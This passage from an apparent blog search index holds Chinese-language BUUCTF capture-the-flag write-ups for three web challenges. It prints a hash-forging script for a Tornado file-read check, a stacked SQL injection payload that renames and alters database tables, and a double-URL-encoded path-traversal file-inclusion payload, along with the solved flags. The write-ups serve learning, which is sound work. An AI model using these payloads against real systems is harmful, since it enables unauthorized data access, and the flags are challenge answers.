keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">:</span>    md5<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>    md5<span class="token punctuation">.</span>update<span class="token punctuation">(</span>str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filename<span class="token operator">=</span><span class="token string">'/fllllllllllllag'</span>    cookie_secret<span class="token operator">=</span><span class="token string">'c9c4e7d6-252c-47f9-a4d2-c2d67afcd4b7'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>md5<span class="token punctuation">(</span>cookie_secret<span class="token operator">+</span>md5<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>最后的filehash为</p><pre class=" language-bash"><code class="language-bash">16a4ec873339e7847bf28e0e0b33803e</code></pre><p>然后构造payload为</p><pre class=" language-bash"><code class="language-bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/file?filename<span class="token operator">=</span>/fllllllllllllag<span class="token operator">&amp;</span>filehash<span class="token operator">=</span>16a4ec873339e7847bf28e0e0b33803e</code></pre><p>得到flag<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-easy-tornado/6.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 模板注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF 强网杯-随便注</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/</url>
      
        <content type="html"><![CDATA[<p>打开环境，看到这样的页面<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/1.jpg" alt=""></p><a id="more"></a><p>加’引号测试<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/2.jpg" alt=""><br>报错<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/3.jpg" alt=""><br>加注释<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/4.jpg" alt=""><br>恢复正常，所以可以判断是单引号的注入</p><p>之后开始判断列数<br>order by测试到3的时候报错<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/5.jpg" alt=""><br>所以一共有两列<br>判断完列数，开始union注入，但回显告诉我们过滤了很多关键字<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/6.jpg" alt=""><br>之后尝试了许多方法想要绕过，但都没有什么效果<br>然后就是学到的新东西了，堆叠注入<br>首先用show databases;爆库<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/7.jpg" alt=""><br>然后show tables;报表<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/8.jpg" alt=""><br>可以看到一共有两个表<br>words和1919810931114514<br>然后查询words表里所有的列</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> words<span class="token punctuation">;</span></code></pre><p><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/9.jpg" alt=""><br>words表里一共两列，id和data，结合我们用1查询出来的结果，也是一个序号一个字符串，所以基本确定我们当前所在的表就是words表<br>再查询1919810931114514表的列</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span><span class="token punctuation">;</span><span class="token punctuation">(</span>纯数字需要用反引号括起来<span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/10.jpg" alt=""><br>可以看到这个表里面有我们需要的flag<br>那么该如何获取flag呢</p><p>我们可以将words表改成另外一个名字，然后将1919810931114514表改为words，这样的话，我们只需要查询words表就能得到flag<br>payload如下</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//417fcd6d-dfd6-4e25-a790-5178dd3c699b.node3.buuoj.cn/?inject=1%27;alter table words rename to word;alter table `1919810931114514` rename to words;alter table words change flag data varchar(100);alter table words add column id int(10)--+</span></code></pre><p>注：这里要注意几个问题：</p><pre><code>对列名进行更改时，要在后面指定修改后的数据类型添加id列时，设置默认值，方便后面查询</code></pre><p>执行完payload后，然后再查询1’ and ‘1’=’1就可以得到flag<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/11.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 堆叠注入 </tag>
            
            <tag> 修改表名和列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF warmup</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-warmup/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-warmup/</url>
      
        <content type="html"><![CDATA[<p>代码审计题目<br>查看源代码，发现提示</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--source.php--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>访问source.php</p><a id="more"></a><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter">?></span> </code></pre><p>代码审计<br>有一个checkFile方法，规定了白名单</p><pre class=" language-php"><code class="language-php"><span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>白名单内有一个hint.php，访问一下</p><pre class=" language-bash"><code class="language-bash">flag not here, and flag <span class="token keyword">in</span> ffffllllaaaagggg</code></pre><p>得到这样的提示，再继续审计代码</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>需要设定page参数并且page要是字符</p><pre class=" language-php"><code class="language-php"><span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>mb_substr是截取字符串的函数，mb_strpos函数则找出字符第一次出现的地方<br>所以上面代码的作用就是，截取page到？第一次出现的地方</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span></code></pre><p>如果截取之后的_page在白名单内则返回真<br>第一次截取之后再对page进行一次url解码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>解码之后在对其进行同样的截取操作<br>同样的，如果截取到的_page在白名单内则返回真</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  </code></pre><p>这一块代码的含义是，如果我们设定了file参数，并且满足file参数是字符串和checkfile方法，就进行文件包含，否则就返回一开始我们见到的那个滑稽<br>审计完了代码，我们需要理清思路<br>1.flag在ffffllllaaaagggg里面<br>2.我们的file要有白名单内的文件<br>3.两次解码(服务器本身就会进行一次url解码，后端又进行一次解码)后依然要满足checkfile方法<br>基于这些要求，我们就能够造出payload</p><pre class=" language-bash"><code class="language-bash">http://2bd8af98-1fcf-46ca-9780-c09e216ffb5e.node3.buuoj.cn/?file<span class="token operator">=</span>source.php%253f<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/ffffllllaaaagggg</code></pre><p>?经过两次url编码之后是%253f，后面的../是用来进行目录穿越的<br>访问一下就能得到flag<br>flag{540b1ff4-daf1-472a-8d21-0a0c9a36884b} </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
